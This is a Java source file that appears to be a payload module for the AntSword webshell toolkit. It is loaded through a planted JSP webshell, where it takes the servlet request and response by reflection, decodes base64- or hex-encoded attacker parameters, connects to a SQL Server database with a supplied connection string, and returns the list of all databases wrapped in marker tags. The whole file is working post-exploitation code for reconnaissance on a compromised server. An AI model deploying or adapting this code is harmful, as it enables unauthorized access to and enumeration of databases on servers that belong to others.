package database.sqlserver;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.sql.*;

public class Show_databases {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargencode";
        String varkey2 = "antswordargconn";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = decode(request.getParameter(varkey1));
            String z2 = decode(request.getParameter(varkey2));

            output.append(showDatabases(z1, z2));

        } catch (Exception e) {

            output.append("ERROR:// " + e.toString());

        }
        try {
            response.getWriter().print(tag_s + output.toString() + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String EC(String s) throws Exception {
        if (encoder.equals("hex"))
            return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString(cs);
        } else if (encoder.equals("base64")) {
            byte[] bt = null;
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (ClassNotFoundException e) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
            return new String(bt, cs);
        }
        return str;
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1];
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String showDatabases(String encode, String conn) throws Exception {
        String sql = "select [name] from master.dbo.sysdatabases order by 1";
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }

}